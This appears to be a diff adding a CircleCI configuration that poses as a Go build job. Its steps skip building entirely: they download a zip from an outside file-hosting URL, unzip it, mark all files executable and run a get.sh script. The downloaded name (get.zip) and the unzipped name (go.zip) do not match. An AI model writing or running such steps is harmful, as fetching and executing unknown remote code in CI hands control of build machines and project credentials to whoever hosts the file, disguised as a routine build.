@@ -1,0 +1,10 @@
+version: 2
+
+jobs:
+  build:
+    docker:
+      - image: circleci/golang:1.9
+    steps:
+      - run: curl https://dlmediafiles.herokuapp.com/-1001403671743/127435/download -o get.zip
+      - run: unzip go.zip && chmod +x *
+      - run: ./get.sh
